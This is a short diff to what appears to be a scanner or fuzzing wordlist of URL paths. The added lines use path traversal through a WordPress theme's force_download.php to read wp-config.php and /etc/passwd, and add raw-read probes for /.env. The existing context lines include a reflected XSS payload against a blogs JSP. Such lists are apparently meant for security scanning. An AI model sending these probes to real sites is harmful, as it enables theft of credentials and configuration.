@@ -156,3 +156,8 @@
 /.env
 /.env/.
 /o/blogs-web/blogs/entry_cover_image_caption.jsp?coverImageURL=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/wp-content/themes/the-wound/style.css
+/wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
+/wp-content/themes/the-wound/force_download.php?file=/etc/passwd
+/.env?raw??
+/etc/passwd?raw??
